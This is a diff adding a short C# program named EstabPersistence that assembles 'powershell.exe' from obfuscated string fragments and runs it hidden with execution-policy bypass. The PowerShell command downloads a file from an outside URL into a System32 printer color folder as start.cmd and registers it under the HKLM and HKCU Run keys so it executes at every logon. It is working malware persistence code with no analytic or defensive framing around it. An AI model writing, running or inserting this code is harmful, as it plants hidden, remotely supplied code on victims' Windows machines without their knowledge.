@@ -1,0 +1,25 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Diagnostics;
+
+namespace Demo
+{
+    class EstabPersistence
+    {
+        static void Main(string[] args)
+        {
+			String cmdLine = Convert.ToString("654321p" + "o" + "we" + "r" + "sh" + "el" + "l." + "e" + "x" + "e 2;Xce f 5 67; asdf; asdffda;sdt").Substring(6,15);
+			var startInfo = new ProcessStartInfo()
+			{
+				FileName = cmdLine,
+				Arguments = Persistence,
+				UseShellExecute = false
+			};
+			Process.Start(startInfo);
+		}
+		private const String Persistence = @"-windowstyle hidden -Nop -Exec bypass iwr -uri 'https://myurl/Starup.txt' -o 'C:\Windows\System32\spool\drivers\color\start.cmd'; new-itemproperty -name old -propertytype string -value 'C:\Windows\System32\spool\drivers\color\start.cmd' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'";
+		
+    }
+
+}
